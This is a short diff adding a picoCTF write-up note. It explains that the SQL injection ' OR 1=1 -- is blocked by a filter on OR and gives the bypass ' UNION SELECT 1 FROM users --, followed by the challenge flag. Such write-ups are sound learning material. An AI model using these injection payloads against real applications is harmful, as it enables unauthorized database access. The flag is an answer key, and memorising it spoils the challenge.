@@ -1,0 +1,4 @@
+We can't use `' OR 1=1 --` beacuse there is a check
+for `OR` but we can use `' UNION SELECT 1 FROM users --`
+
+picoCTF{w3lc0m3_t0_th3_vau1t_06857925}
